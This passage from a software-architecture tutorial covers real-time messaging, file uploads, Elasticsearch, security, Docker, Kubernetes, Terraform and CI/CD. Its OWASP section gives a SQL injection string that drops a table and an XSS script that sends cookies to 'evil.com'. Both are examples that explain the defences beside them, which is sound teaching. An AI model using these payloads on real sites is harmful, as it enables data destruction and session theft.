      io.to(`room:${data.recipientId}`).emit('message', data);  // Send to recipient
    });
  });
  
  Pros: Fully bi-directional, lowest latency, real-time
  Cons: Stateful connection (complicates horizontal scaling — see below)
  
  Use for: Chat, live games, collaborative editing, live video comments
```

### 13.2 Scaling WebSockets Horizontally

WebSockets create stateful connections, which breaks when you have multiple servers:

```
PROBLEM:
  Server 1: Alice connected
  Server 2: Bob connected
  
  Bob sends message to Alice.
  Request goes to Server 2 (Bob is connected there).
  Server 2 tries to emit to Alice... but Alice is connected to Server 1!
  Server 2 doesn't know about Alice. Message is lost.

SOLUTION: Redis Pub/Sub Adapter

  When Bob sends to Alice:
  
  Server 2:
    1. Save message to Cassandra (permanent storage)
    2. Publish to Redis: { channel: "user:alice", message: {...} }
  
  Server 1 (has Redis subscription):
    3. Receives the Redis publication
    4. Looks up: "Is Alice connected to me?" YES.
    5. Emits message to Alice's WebSocket connection
  
  ┌──────────────┐     Redis      ┌──────────────┐
  │   Server 1   │ ←─────────── ─ │   Server 2   │
  │ Alice socket │   Pub/Sub      │  Bob socket  │
  └──────────────┘                └──────────────┘

// Socket.IO with Redis adapter:
const { createClient } = require('redis');
const { createAdapter } = require('@socket.io/redis-adapter');

const pubClient = createClient({ url: 'redis://redis:6379' });
const subClient = pubClient.duplicate();

await Promise.all([pubClient.connect(), subClient.connect()]);

io.adapter(createAdapter(pubClient, subClient));
// Now all Socket.IO servers share state via Redis
// Messages are correctly routed regardless of which server handles each connection
```

### 13.3 WebRTC for Peer-to-Peer Video Calls

```
WebRTC enables direct browser-to-browser video/audio without going through your server:

SIGNALING FLOW (how two peers find each other):

Browser A                    Signal Server (your WebSocket)      Browser B
    │                              │                                 │
    │── ICE Candidates ───────────→│                                 │
    │   (my network addresses)     │────── Forward to B ────────────→│
    │                              │                                 │
    │                              │←──── ICE Candidates ────────────│
    │←─────────── Forward to A ────│                                 │
    │                              │                                 │
    │── SDP Offer ─────────────────→│                                 │
    │   (my video/audio capabilities│────── Forward to B ────────────→│
    │                              │                                 │
    │                              │←───── SDP Answer ───────────────│
    │←─────────── Forward to A ────│                                 │
    │                              │                                 │
    │◄══════ Direct P2P Video/Audio Connection (no server) ══════════►│
    │                              │                                 │

// Once connected, video never goes through your server
// → Saves massive bandwidth costs
// → Lower latency (direct connection)
// TURN servers are fallback when direct connection isn't possible (corporate firewalls)
```

---

## 14. Layer 11: File Storage and Media Processing

### 14.1 Why Never Store Files in Your Database

```
❌ WRONG: Storing files in PostgreSQL
  INSERT INTO photos (user_id, image_data) VALUES (?, BYTEA_OF_THE_IMAGE);
  
  Problems:
  - 1 million photos × 5MB average = 5 terabytes in your database
  - Database is not designed for large binary reads
  - Backups take forever
  - Cannot use CDN to serve images
  - Database becomes the bottleneck for ALL file requests

✅ RIGHT: Object Storage (S3)
  1. Upload file to AWS S3
  2. Store only the S3 URL in your database:
     INSERT INTO photos (user_id, s3_url) VALUES (?, 'https://cdn.yourapp.com/photos/abc.jpg')
  3. Serve the file directly from S3/CDN (your server is not involved at all)
```

### 14.2 Secure File Upload Architecture

Never let users upload directly to your application server:

```
SECURE UPLOAD FLOW:

Step 1: Client requests an upload URL
  POST /api/media/upload-url
  Body: { filename: "resume.pdf", contentType: "application/pdf", fileSize: 1048576 }

Step 2: Server validates and generates a pre-signed S3 URL
  // Server code:
  const s3 = new S3Client({ region: 'us-east-1' });
  
  const uploadUrl = await getSignedUrl(s3, new PutObjectCommand({
    Bucket: 'yourapp-user-uploads',
    Key: `uploads/${userId}/${uuid()}.pdf`,
    ContentType: 'application/pdf',
    ContentLength: 1048576,
    Metadata: { userId, originalName: 'resume.pdf' }
  }), { expiresIn: 300 });  // URL valid for only 5 minutes
  
  return { uploadUrl, key: 'uploads/usr_123/abc123.pdf' };

Step 3: Client uploads DIRECTLY to S3 using the pre-signed URL
  // This upload goes directly to S3 — your server is NOT involved
  // This avoids your server becoming a bandwidth bottleneck
  await fetch(uploadUrl, {
    method: 'PUT',
    body: file,
    headers: { 'Content-Type': 'application/pdf' }
  });

Step 4: Client notifies your server that upload is complete
  POST /api/media/confirm-upload
  Body: { key: 'uploads/usr_123/abc123.pdf' }

Step 5: Server triggers async processing via Kafka
  kafka.producer.send({ topic: 'media.uploaded', messages: [{ value: JSON.stringify({ key, userId, type: 'pdf' }) }] });

Step 6: Media Processing Service processes the file
  - For PDFs: Extract text (for the Resume Parser in this repo!)
  - For images: Generate thumbnails, convert to WebP
  - For videos: Transcode to multiple qualities (360p, 720p, 1080p)
  - Move from uploads/ to processed/ prefix in S3

Step 7: Update database with final URL
  UPDATE resumes SET status = 'processed', s3_url = 'processed/usr_123/abc123.pdf' WHERE ...
```

### 14.3 Video Processing Pipeline (YouTube/TikTok-Scale)

```
User uploads video (raw 4K file, 2GB)
        ↓
UPLOAD: Client → S3 (pre-signed URL, chunked upload for large files)
        ↓
KAFKA EVENT: { topic: "video.uploaded", key: videoId, ... }
        ↓
VIDEO PROCESSING WORKERS (Kubernetes Jobs, scaled on demand):

Worker 1: Transcoding (most CPU-intensive)
  ffmpeg -i input.mp4 -vf scale=1280:720 -c:v libx264 -crf 23 output_720p.mp4
  ffmpeg -i input.mp4 -vf scale=854:480 -c:v libx264 -crf 23 output_480p.mp4
  ffmpeg -i input.mp4 -vf scale=640:360 -c:v libx264 -crf 23 output_360p.mp4
  
  → Uploads all variants to S3

Worker 2: Thumbnail Generation
  ffmpeg -i input.mp4 -vframes 1 -ss 00:00:05 thumbnail.jpg
  → Upload to S3, run through image resize pipeline

Worker 3: Audio Track Extraction
  ffmpeg -i input.mp4 -vn -acodec aac audio.m4a
  → Used for speech-to-text captions (accessibility)

Worker 4: Content Moderation
  → Send video to AI moderation service (AWS Rekognition or custom model)
  → Flag if it contains prohibited content (violence, NSFW)
  → If flagged: quarantine, notify moderation team

Worker 5: Metadata Extraction
  → Extract duration, codec info, fps, resolution
  → Store in database

All workers publish completion events to Kafka "video.processed" topic

Database updated:
  { status: "ready", qualities: ["360p", "480p", "720p"], thumbnailUrl: "..." }

User is notified via WebSocket: "Your video is ready to watch"
```

---

## 15. Layer 12: Search Infrastructure

### 15.1 Why PostgreSQL Is Not a Search Engine

```
PostgreSQL with LIKE query:
  SELECT * FROM jobs WHERE title LIKE '%software engineer%' OR description LIKE '%software engineer%';
  
  Performance:
  - 1 million rows → 2 seconds
  - 10 million rows → 20 seconds
  - 100 million rows → 3+ minutes
  - Cannot handle typos: searching "enginere" finds nothing
  - Cannot rank by relevance (which result is most relevant?)
  - Cannot search multiple fields with different weights

PostgreSQL Full-Text Search (FTS):
  Better, but still limited:
  CREATE INDEX jobs_fts_idx ON jobs USING GIN (to_tsvector('english', title || ' ' || description));
  
  Improvement: 
  - 100 million rows → 100ms (with proper GIN index)
  - Handles stemming (searching "engineering" matches "engineer")
  - Still no fuzzy matching, complex relevance scoring, or horizontal scaling
```

### 15.2 Elasticsearch Architecture

```
ELASTICSEARCH CONCEPTS:

Index: Like a database table
  "jobs_index" stores all job documents

Document: Like a row in a table
  { "title": "Senior Engineer", "company": "TechCorp", "description": "..." }

Inverted Index (the magic behind fast search):
  Traditional database index: Row → Fields
  Inverted index: Word → Which documents contain this word
  
  "engineer" → [doc1, doc5, doc12, doc99, ...]
  "senior" → [doc1, doc3, doc22, ...]
  
  Search "senior engineer":
    Find intersection of documents containing BOTH "senior" AND "engineer"
    → [doc1, ...]
    → Takes milliseconds even with 1 billion documents

Shards: Elasticsearch splits each index across multiple shards (partitions)
  Primary Shard: Handles writes and reads
  Replica Shard: Copy of primary, handles reads (load balancing) and failover

Cluster: Multiple Elasticsearch nodes working together
  Each node holds some shards
  If one node fails, replicas on other nodes take over
```

### 15.3 Elasticsearch Mapping (Schema)

```json
PUT /jobs_index
{
  "settings": {
    "number_of_shards": 5,
    "number_of_replicas": 2,
    "analysis": {
      "analyzer": {
        "job_analyzer": {
          "type": "custom",
          "tokenizer": "standard",
          "filter": ["lowercase", "stop", "snowball"]
        }
      }
    }
  },
  "mappings": {
    "properties": {
      "title": {
        "type": "text",
        "analyzer": "job_analyzer",
        "fields": {
          "keyword": { "type": "keyword" }
        }
      },
      "company": {
        "type": "text",
        "fields": {
          "keyword": { "type": "keyword" }
        }
      },
      "raw_description": {
        "type": "text",
        "analyzer": "job_analyzer"
      },
      "scraped_at": { "type": "date" },
      "salary_min": { "type": "integer" },
      "salary_max": { "type": "integer" },
      "location": { "type": "keyword" },
      "remote": { "type": "boolean" }
    }
  }
}
```

### 15.4 Advanced Search Queries

```typescript
// Complex search: "Find React jobs in London, not remote, posted in last 7 days"
const result = await esClient.search({
  index: 'jobs_index',
  body: {
    query: {
      bool: {
        must: [
          {
            multi_match: {
              query: "React developer",
              fields: ["title^3", "raw_description"],  // title is 3x more important
              fuzziness: "AUTO",  // "Reakt" → still matches "React"
              operator: "or"
            }
          }
        ],
        filter: [
          { term: { location: "London" } },
          { term: { remote: false } },
          {
            range: {
              scraped_at: {
                gte: "now-7d/d"  // Last 7 days
              }
            }
          },
          {
            range: {
              salary_min: { gte: 60000 }  // Minimum salary filter
            }
          }
        ]
      }
    },
    // Return aggregations (facets) for filtering UI
    aggs: {
      by_company: {
        terms: { field: "company.keyword", size: 10 }
      },
      salary_ranges: {
        range: {
          field: "salary_min",
          ranges: [
            { to: 50000, key: "Under £50k" },
            { from: 50000, to: 80000, key: "£50k-£80k" },
            { from: 80000, key: "Over £80k" }
          ]
        }
      }
    },
    sort: [
      { _score: { order: "desc" } },   // Primary sort: relevance
      { scraped_at: { order: "desc" } } // Secondary sort: newest first
    ],
    from: 0,
    size: 20
  }
});
```

---

## 16. Layer 13: Security Architecture (In Depth)

### 16.1 The OWASP Top 10 and How to Prevent Each

The Open Web Application Security Project publishes the most critical web security risks:

**1. Injection (SQL Injection, NoSQL Injection, Command Injection)**

```
ATTACK:
  GET /api/users?id=1 OR 1=1; DROP TABLE users; --
  
  If code is: `SELECT * FROM users WHERE id = ${req.query.id}`
  → Executes: SELECT * FROM users WHERE id = 1 OR 1=1; DROP TABLE users;
  → Entire users table is deleted

DEFENSE:
  ALWAYS use parameterized queries / prepared statements:
  prisma.user.findUnique({ where: { id: req.query.id } })  // ✅ Safe
  
  // Or raw SQL with parameters:
  await db.query('SELECT * FROM users WHERE id = $1', [userId]);  // ✅ Safe
  // The $1 is a placeholder — userId is NEVER interpreted as SQL
```

**2. Broken Authentication**
```
ATTACK: Weak passwords, no rate limiting → brute force login
DEFENSE:
  - bcrypt password hashing (slow by design)
  - Account lockout after 5 failed attempts
  - MFA
  - Session fixation prevention (regenerate session ID after login)
  - Secure, HttpOnly cookies
```

**3. Cross-Site Scripting (XSS)**
```
ATTACK:
  Malicious user posts this comment on your site:
  <script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
  
  If your site displays this without escaping it:
  → Every user who views the comment has their cookies stolen
  → Attacker logs in as them

DEFENSE:
  1. HTML escaping on all user content (React does this automatically for {variable})
  2. Content Security Policy (CSP) header:
     Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-RANDOM123'
     → Browser refuses to execute any script not from your domain
  3. HttpOnly cookies (script cannot read them even if XSS succeeds)
```

**4. Security Misconfiguration**
```
EXAMPLES:
  - Default passwords in production (admin/admin)
  - Debug mode enabled in production (exposes stack traces)
  - Verbose error messages (reveals database schema to attacker)
  - Open S3 buckets (private files publicly accessible)
  - API keys in Git repository

DEFENSE:
  - Environment variables for ALL secrets (never in code)
  - Different configs for dev/staging/production
  - Regular security audits of cloud configurations
  - Git pre-commit hooks to detect secrets: `git-secrets --install`
  - Infrastructure scanning tools: AWS Config, Checkov, tfsec
```

**5. Sensitive Data Exposure**
```
DEFENSE:
  - Encrypt data at rest: AWS RDS encryption, S3 server-side encryption
  - TLS everywhere (HTTPS only, no HTTP)
  - HSTS header: Strict-Transport-Security: max-age=31536000; includeSubDomains
    → Browser remembers to ONLY use HTTPS for your domain for 1 year
  - Never log sensitive data (passwords, tokens, credit card numbers)
  - PCI-DSS compliance for payment data (use Stripe — never store raw card numbers)
  - GDPR compliance for EU user data
```

### 16.2 Infrastructure Security — Defense in Depth

```
SECURITY LAYERS:

Layer 1: Cloudflare (Network Perimeter)
  - DDoS mitigation
  - WAF rules blocking known attack patterns
  - IP reputation filtering
  - Rate limiting at DNS level

Layer 2: AWS Security Groups (Virtual Firewalls)
  - Allow only port 80/443 from internet → Load Balancer
  - Allow only port 3000-9000 from Load Balancer → App servers
  - Allow only port 5432 from App servers → Database
  - DENY all other traffic
  
  Production database rule:
  "PostgreSQL accepts connections ONLY from IP addresses within the VPC private subnet"
  → The database is COMPLETELY INVISIBLE to the public internet

Layer 3: VPC (Virtual Private Cloud)
  Public Subnet (internet-facing):
    - Load Balancer
    - Bastion host (for SSH access)
  
  Private Subnet (no internet access):
    - Application servers (Kubernetes nodes)
    - Databases (PostgreSQL, MongoDB, Redis)
    - Kafka brokers
  
  Even if your application is hacked, the attacker cannot directly reach
  your databases from the internet.

Layer 4: Kubernetes RBAC
  - Service accounts with minimal permissions
  - No service can access another service's secrets
  - Network policies: payment-service → ONLY communicates with database, Kafka, stripe-api
                      no other service can call payment-service directly

Layer 5: Application Security (mTLS within Kubernetes)
  - All inter-service communication is encrypted with mutual TLS
  - Both services verify each other's identity (not just one-way)
  - Istio service mesh handles this automatically

Layer 6: Database Encryption
  - Encryption at rest: AES-256 (AWS RDS enables this by default)
  - Encryption in transit: TLS between app and database
  - Column-level encryption for PII (Personally Identifiable Information):
    - SSN, passport numbers encrypted with application-level keys
    - Even if the database is compromised, these fields are unreadable
```

### 16.3 Secret Management

```
❌ WRONG (almost everyone starts here):
  // Hardcoded in code:
  const DB_PASSWORD = "password123";
  
  // In .env committed to Git:
  DATABASE_URL=postgresql://admin:password123@db:5432/prod
  
  Problems:
  - Anyone with code access has production database access
  - Secret lives forever in Git history
  - Rotating the secret requires a code deployment

✅ RIGHT: HashiCorp Vault or AWS Secrets Manager

  // At application startup:
  const secrets = await vault.read('secret/production/database');
  const dbPassword = secrets.data.password;
  
  Benefits:
  - Secrets never appear in code or Git
  - Automatic rotation: Vault can rotate the DB password every 24 hours
    and update the running application without restart
  - Fine-grained access: Service A can access secret/serviceA/* only
  - Audit log: "At 3:42pm, service-user-pod-7 accessed the database password"
  - Emergency revocation: Rotate all secrets instantly if a breach is suspected
```

---

## 17. Layer 14: Containerization with Docker

### 17.1 Docker Internals — How Containers Work

Containers are NOT virtual machines. Understanding the difference is critical:

```
VIRTUAL MACHINE:

┌───────────────────────────────┐
│  Physical Server Hardware     │
└───────────────────────────────┘
┌───────────────────────────────┐
│  Host Operating System        │
└───────────────────────────────┘
┌───────────────────────────────┐
│  Hypervisor (VMware, KVM)     │
└───────────────────────────────┘
┌──────────────┐ ┌──────────────┐
│  VM 1        │ │  VM 2        │
│  Guest OS    │ │  Guest OS    │ ← Each VM has its own full OS (3-10GB)
│  App         │ │  App         │
└──────────────┘ └──────────────┘

VM startup: 30-90 seconds (booting a full OS)
VM overhead: 3-10GB disk per VM (full OS)
```

```
DOCKER CONTAINERS:

┌───────────────────────────────┐
│  Physical Server Hardware     │
└───────────────────────────────┘
┌───────────────────────────────┐
│  Host Operating System        │ ← Containers SHARE this OS kernel
└───────────────────────────────┘
┌───────────────────────────────┐
│  Docker Engine                │
└───────────────────────────────┘
┌────────┐ ┌────────┐ ┌────────┐
│Cont. 1 │ │Cont. 2 │ │Cont. 3 │
│ App    │ │ App    │ │ App    │ ← No OS per container (just app + dependencies)
└────────┘ └────────┘ └────────┘

Container startup: 0.1-1 second (no OS boot)
Container overhead: 10-200MB (just your app)
```

Docker uses two Linux kernel features:
- **Namespaces**: Each container gets its own view of the filesystem, process list, network, etc. — isolation without a full OS
- **cgroups**: Limit CPU, memory, and network resources per container

### 17.2 Multi-Stage Dockerfile Mastery

```dockerfile
# ─────────────────────────────────────────────────────────
# service-user/Dockerfile
# ─────────────────────────────────────────────────────────

# STAGE 1: Dependencies (cached separately for fast rebuilds)
FROM node:20-alpine AS deps
WORKDIR /app
# Copy only package files first
# If package.json didn't change, Docker uses cached node_modules
COPY package.json package-lock.json ./
RUN npm ci --only=production  # Install exact versions from lockfile

# STAGE 2: Builder
FROM node:20-alpine AS builder
WORKDIR /app
COPY --from=deps /app/node_modules ./node_modules
COPY . .
# Generate Prisma client (needs prisma schema)
RUN npx prisma generate
# Compile TypeScript to JavaScript
RUN npm run build
# Result: dist/ folder with compiled JS

# STAGE 3: Production image (smallest possible)
FROM node:20-alpine AS production
WORKDIR /app

# Create non-root user for security
# Never run containers as root — if hacked, attacker gets root inside container
RUN addgroup -g 1001 -S nodejs
RUN adduser -S nestjs -u 1001

# Copy only what's needed to run the app
COPY --from=builder --chown=nestjs:nodejs /app/dist ./dist
COPY --from=deps --chown=nestjs:nodejs /app/node_modules ./node_modules
COPY --from=builder --chown=nestjs:nodejs /app/prisma ./prisma

# Switch to non-root user
USER nestjs

# Document which port the app uses
EXPOSE 3000

# Health check — Docker/Kubernetes knows if the container is healthy
HEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \
  CMD wget --no-verbose --tries=1 --spider http://localhost:3000/health || exit 1

# Start the application
CMD ["node", "dist/main.js"]
```

### 17.3 Docker Compose in Production

Docker Compose is for **local development and testing**, not for production at scale. Here is a complete, production-quality docker-compose for development:

```yaml
# docker-compose.yml
# DO NOT USE IN PRODUCTION — use Kubernetes for production

services:
  api-gateway:
    image: nginx:alpine
    ports:
      - "80:80"
    volumes:
      - ./nginx/nginx.conf:/etc/nginx/nginx.conf:ro
    healthcheck:
      test: ["CMD", "nginx", "-t"]
      interval: 30s
      timeout: 5s
      retries: 3
    networks:
      - microservices-net
    restart: unless-stopped

  user-service:
    build:
      context: ./service-user
      dockerfile: Dockerfile
      target: production  # Use the production stage of multi-stage build
    environment:
      - NODE_ENV=production
      - DATABASE_URL=postgresql://admin:${DB_PASSWORD}@user-postgres:5432/job_platform
      - RESUME_GRPC_URL=resume-grpc:50051
    secrets:
      - db_password
      - jwt_private_key
    volumes:
      - shared_uploads:/uploads
    healthcheck:
      test: ["CMD", "wget", "--spider", "http://localhost:3000/health"]
      interval: 30s
      timeout: 5s
      retries: 3
    deploy:
      resources:
        limits:
          cpus: '1.0'
          memory: 512M
        reservations:
          memory: 256M
    depends_on:
      user-postgres:
        condition: service_healthy
      resume-grpc:
        condition: service_healthy
    networks:
      - microservices-net
    restart: unless-stopped

  user-postgres:
    image: postgres:16-alpine
    environment:
      POSTGRES_USER: admin
      POSTGRES_PASSWORD_FILE: /run/secrets/db_password
      POSTGRES_DB: job_platform
    secrets:
      - db_password
    volumes:
      - postgres_data:/var/lib/postgresql/data
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U admin -d job_platform"]
      interval: 10s
      timeout: 5s
      retries: 5
    networks:
      - microservices-net
    restart: unless-stopped

# Secrets management (reads from files, not env vars)
secrets:
  db_password:
    file: ./secrets/db_password.txt
  jwt_private_key:
    file: ./secrets/jwt_private_key.pem

networks:
  microservices-net:
    driver: bridge
    ipam:
      config:
        - subnet: 172.20.0.0/16

volumes:
  postgres_data:
    driver: local
  shared_uploads:
    driver: local
```

---

## 18. Layer 15: Container Orchestration with Kubernetes

### 18.1 Why Kubernetes When You Have Docker Compose?

```
DOCKER COMPOSE limitations:
  - Runs on ONE machine only
  - If the machine dies, everything dies
  - Manual scaling: you must manually run `docker compose up --scale service=5`
  - No self-healing: if a container crashes, you manually restart it
  - No zero-downtime deployments
  - No resource limits enforcement across a cluster
  - No secrets management at scale
  - No advanced networking (service mesh)

KUBERNETES:
  - Runs across a CLUSTER of machines (can be 1000+ nodes)
  - If one machine dies, containers automatically reschedule to healthy machines
  - Auto-scaling: CPU at 80%? Automatically add more containers
  - Self-healing: Container crashed? Automatically restart it
  - Zero-downtime rolling deployments built in
  - Fine-grained resource allocation across the cluster
  - Native secrets management (Kubernetes Secrets → HashiCorp Vault integration)
  - Pluggable networking (Calico, Cilium)
```

### 18.2 Kubernetes Architecture

```
KUBERNETES CLUSTER:

┌─────────────────────────────────────────────────────────────┐
│                    CONTROL PLANE                            │
│                                                             │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────────┐ │
│  │  kube-apiserver │  etcd        │  │  kube-scheduler  │ │
│  │ (REST API for   │ (Cluster     │  │ (Assigns pods    │ │
│  │  kubectl)       │  state DB)   │  │  to nodes)       │ │
│  └──────────────┘  └──────────────┘  └──────────────────┘ │
│  ┌──────────────────────────────────────────────────────┐  │
│  │  kube-controller-manager                             │  │
│  │  (Reconciliation loop: Desired state → Actual state) │  │
│  └──────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────┘
              │                │                │
              ▼                ▼                ▼
┌────────────────┐  ┌──────────────┐  ┌────────────────────┐
│   WORKER NODE 1│  │WORKER NODE 2 │  │   WORKER NODE 3    │
│                │  │              │  │                    │
│ ┌─────────────┐│  │┌────────────┐│  │ ┌────────────────┐ │
│ │ user-service││  ││feed-service││  │ │ notification   │ │
│ │  pod 1      ││  ││  pod 1     ││  │ │ service pod 1  │ │
│ └─────────────┘│  │└────────────┘│  │ └────────────────┘ │
│ ┌─────────────┐│  │┌────────────┐│  │ ┌────────────────┐ │
│ │ user-service││  ││feed-service││  │ │ user-service   │ │
│ │  pod 2      ││  ││  pod 2     ││  │ │ pod 3          │ │
│ └─────────────┘│  │└────────────┘│  │ └────────────────┘ │
│ kubelet         │  │ kubelet      │  │ kubelet            │
│ kube-proxy      │  │ kube-proxy   │  │ kube-proxy         │
└────────────────┘  └──────────────┘  └────────────────────┘
```

### 18.3 Core Kubernetes Objects

**Deployment — Manage Your Pods**

```yaml
# user-service-deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: user-service
  namespace: production
spec:
  replicas: 5  # Run 5 identical copies of the container
  
  selector:
    matchLabels:
      app: user-service
  
  strategy:
    type: RollingUpdate
    rollingUpdate:
      maxUnavailable: 1  # During update, at most 1 pod can be down
      maxSurge: 2        # During update, can temporarily have 2 extra pods
  
  template:
    metadata:
      labels:
        app: user-service
        version: "2.1.0"
    
    spec:
      containers:
        - name: user-service
          image: gcr.io/yourcompany/user-service:2.1.0
          
          ports:
            - containerPort: 3000
          
          env:
            - name: NODE_ENV
              value: "production"
            - name: DATABASE_URL
              valueFrom:
                secretKeyRef:
                  name: user-service-secrets
                  key: database-url  # References Kubernetes Secret
          
          resources:
            requests:
              cpu: "250m"     # 0.25 CPU cores guaranteed
              memory: "256Mi" # 256MB RAM guaranteed
            limits:
              cpu: "1000m"    # Never use more than 1 CPU core
              memory: "512Mi" # Never use more than 512MB RAM
          
          readinessProbe:
            httpGet:
              path: /health
              port: 3000
            initialDelaySeconds: 10
            periodSeconds: 5
            # Pod receives traffic ONLY when /health returns 200
          
          livenessProbe:
            httpGet:
              path: /health
              port: 3000
            initialDelaySeconds: 30
            periodSeconds: 10
            # Pod is RESTARTED if /health fails 3 times in a row
```

**Horizontal Pod Autoscaler — Auto-Scaling**

```yaml
# user-service-hpa.yaml
apiVersion: autoscaling/v2
kind: HorizontalPodAutoscaler
metadata:
  name: user-service-hpa
spec:
  scaleTargetRef:
    apiVersion: apps/v1
    kind: Deployment
    name: user-service
  
  minReplicas: 3   # Always run at least 3 pods
  maxReplicas: 50  # Never exceed 50 pods
  
  metrics:
    # Scale up when CPU > 70%
    - type: Resource
      resource:
        name: cpu
        target:
          type: Utilization
          averageUtilization: 70
    
    # Scale up when memory > 80%
    - type: Resource
      resource:
        name: memory
        target:
          type: Utilization
          averageUtilization: 80
    
    # Custom metric: scale up when request queue > 100
    - type: External
      external:
        metric:
          name: http_requests_in_queue
        target:
          type: AverageValue
          averageValue: "100"
```

---

## 19. Layer 16: Infrastructure as Code with Terraform

### 19.1 The Problem Terraform Solves

```
TRADITIONAL "ClickOps" (Bad):
  1. DevOps engineer logs into AWS console
  2. Clicks through 50 screens to create VPC, subnets, security groups...
  3. Creates 3 EC2 instances
  4. Sets up RDS database
  5. Configures load balancer
  
  Problems:
  - No record of exactly what was created
  - Cannot reproduce exact same environment (staging vs production drift)
  - Takes 2 days per environment
  - One wrong click can destroy production
  - When engineer leaves, no one knows why things are configured the way they are

TERRAFORM "Infrastructure as Code" (Good):
  1. Write .tf files describing desired infrastructure
  2. `terraform plan` → Shows what will be created/changed/destroyed (preview)
  3. `terraform apply` → Creates everything automatically in 10 minutes
  4. .tf files committed to Git → Version history, code reviews for infrastructure
  5. `terraform destroy` → Tear down everything cleanly (no orphaned resources)
```

### 19.2 Terraform for the Complete Production Stack

```hcl
# main.tf — Production infrastructure for job-aggregator-platform

terraform {
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 5.0"
    }
  }
  
  # Store Terraform state in S3 (never on local disk in team environments)
  backend "s3" {
    bucket = "yourcompany-terraform-state"
    key    = "production/job-platform/terraform.tfstate"
    region = "us-east-1"
    # State locking — prevents two engineers running terraform apply simultaneously
    dynamodb_table = "terraform-locks"
    encrypt        = true
  }
}

provider "aws" {
  region = var.aws_region
}

# ─────────────────────────────────────────────────────
# NETWORKING: VPC, Subnets, Route Tables
# ─────────────────────────────────────────────────────

resource "aws_vpc" "main" {
  cidr_block           = "10.0.0.0/16"
  enable_dns_hostnames = true
  enable_dns_support   = true
  
  tags = { Name = "job-platform-vpc", Environment = "production" }
}

resource "aws_subnet" "public" {
  count             = 3  # One per availability zone (for high availability)
  vpc_id            = aws_vpc.main.id
  cidr_block        = "10.0.${count.index}.0/24"
  availability_zone = data.aws_availability_zones.available.names[count.index]
  
  map_public_ip_on_launch = true  # EC2 instances get public IPs
  tags = { Name = "public-subnet-${count.index}" }
}

resource "aws_subnet" "private" {
  count             = 3  # Databases live here — no internet access
  vpc_id            = aws_vpc.main.id
  cidr_block        = "10.0.${count.index + 10}.0/24"
  availability_zone = data.aws_availability_zones.available.names[count.index]
  
  tags = { Name = "private-subnet-${count.index}" }
}

# ─────────────────────────────────────────────────────
# KUBERNETES: EKS (Elastic Kubernetes Service)
# ─────────────────────────────────────────────────────

resource "aws_eks_cluster" "main" {
  name     = "job-platform-cluster"
  role_arn = aws_iam_role.eks_cluster.arn
  version  = "1.29"
  
  vpc_config {
    subnet_ids              = aws_subnet.private[*].id
    endpoint_private_access = true
    endpoint_public_access  = true  # Allow kubectl from internet (with IAM auth)
  }
}

resource "aws_eks_node_group" "main" {
  cluster_name    = aws_eks_cluster.main.name
  node_group_name = "main-workers"
  node_role_arn   = aws_iam_role.eks_node.arn
  subnet_ids      = aws_subnet.private[*].id
  
  instance_types = ["t3.xlarge"]  # 4 vCPUs, 16GB RAM
  
  scaling_config {
    desired_size = 5   # Start with 5 nodes
    min_size     = 3   # Never fewer than 3 (high availability)
    max_size     = 20  # Scale up to 20 during traffic spikes
  }
  
  update_config {
    max_unavailable = 1  # Only take down 1 node at a time during updates
  }
}

# ─────────────────────────────────────────────────────
# DATABASE: RDS PostgreSQL (Managed)
# ─────────────────────────────────────────────────────

resource "aws_db_instance" "postgres" {
  identifier = "job-platform-postgres"
  
  engine         = "postgres"
  engine_version = "16.1"
  instance_class = "db.r6g.xlarge"  # 4 vCPUs, 32GB RAM
  
  allocated_storage     = 100  # GB
  max_allocated_storage = 1000 # Auto-scale up to 1TB
  storage_type          = "gp3"
  storage_encrypted     = true
  
  db_name  = "job_platform"
  username = "admin"
  password = var.db_password  # From Terraform variable, not hardcoded
  
  # Multi-AZ: Automatically failover to replica in another availability zone
  # If the primary goes down, failover happens in ~60 seconds automatically
  multi_az = true
  
  # Backups
  backup_retention_period = 30  # Keep 30 days of backups
  backup_window           = "03:00-04:00"  # 3-4am UTC
  
  # Maintenance
  maintenance_window      = "Mon:04:00-Mon:05:00"
  auto_minor_version_upgrade = true
  
  # Security: Database is in private subnet — not reachable from internet
  db_subnet_group_name   = aws_db_subnet_group.main.name
  vpc_security_group_ids = [aws_security_group.rds.id]
  
  deletion_protection = true  # Prevent accidental deletion
  
  tags = { Environment = "production", Service = "user-service" }
}

# Security group: Only accept connections from EKS nodes
resource "aws_security_group" "rds" {
  name   = "rds-security-group"
  vpc_id = aws_vpc.main.id
  
  ingress {
    from_port       = 5432
    to_port         = 5432
    protocol        = "tcp"
    security_groups = [aws_security_group.eks_nodes.id]  # Only from EKS
  }
  
  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }
}
```

---

## 20. Layer 17: CI/CD Pipeline

### 20.1 The Complete CI/CD Philosophy

CI/CD stands for Continuous Integration and Continuous Deployment. The goal is:

```
GOAL: 
  A developer pushes code → Running in production in 10 minutes
  With complete confidence that the change won't break anything

WHY THIS MATTERS:
  Old way: Deploy every 2 weeks → 2 weeks of changes to test → Risky
  CI/CD way: Deploy 100 times per day → 1 change per deploy → Very low risk
  
  Small, frequent deployments = dramatically safer than large, infrequent ones
```

### 20.2 The Complete Pipeline

```yaml
# .github/workflows/production-deploy.yml

name: Production Deployment Pipeline

on:
  push:
    branches: [main]

env:
  REGISTRY: gcr.io
  IMAGE_NAME: ${{ github.repository }}

jobs:
  # ─────────────────────────────────────────────────────
  # PHASE 1: QUALITY GATES (All must pass before deploy)
  # ─────────────────────────────────────────────────────
  
  lint-and-typecheck:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'
      
      - run: npm ci
      - run: npm run lint          # ESLint — catch code style issues
      - run: npm run typecheck     # TypeScript — catch type errors
  
  unit-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: '20', cache: 'npm' }
      
      - run: npm ci
